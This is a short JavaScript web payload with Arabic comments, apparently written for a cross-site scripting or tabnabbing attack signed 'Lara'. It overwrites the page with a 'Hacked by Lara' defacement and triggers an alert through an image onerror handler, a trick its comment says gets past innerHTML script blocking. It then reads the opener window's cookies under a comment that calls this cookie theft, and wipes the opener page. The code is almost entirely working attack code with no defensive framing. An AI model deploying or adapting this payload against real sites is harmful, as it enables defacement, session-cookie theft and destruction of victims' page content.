// 1. طباعة العلامة
console.log("Lara: Acting from the new tab...");

// 2. مسح محتوى الصفحة وبناء واجهة جديدة
// لاحظ استخدام صورة لتنفيذ الـ alert لأن السكريبت المباشر لا يعمل في innerHTML
document.body.innerHTML = `
    <div style='background:black; color:red; text-align:center; padding-top:100px; height:100vh;'>
        <h1>Hacked by Lara</h1>
        <img src="x" onerror="alert('Lara: 300 Triggered');">
    </div>
`;

// 3. سرقة الكوكيز (إذا كان هناك Opener)
if (window.opener) {
    try {
        const cookies = window.opener.document.cookie;
        console.log("Lara: Cookies from original page:", cookies);
        
        // مسح صفحة الضحية أيضاً
        window.opener.document.body.innerHTML = "<h1 style='color:red;'>WIPED BY LARA</h1>";
    } catch (e) {
        console.log("Lara: Could not access opener due to CORS Policy.");
    }
}
